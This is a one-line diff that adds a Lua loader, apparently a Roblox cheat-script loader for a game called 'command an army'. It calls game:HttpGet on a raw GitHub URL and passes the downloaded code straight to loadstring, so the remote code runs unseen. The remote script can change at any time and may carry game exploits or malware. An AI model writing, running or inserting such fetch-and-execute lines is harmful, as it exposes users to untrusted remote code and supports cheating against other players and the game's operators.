@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/upd-command-an-army-spam1-k0ly62rbo5ilgo.lua"))()
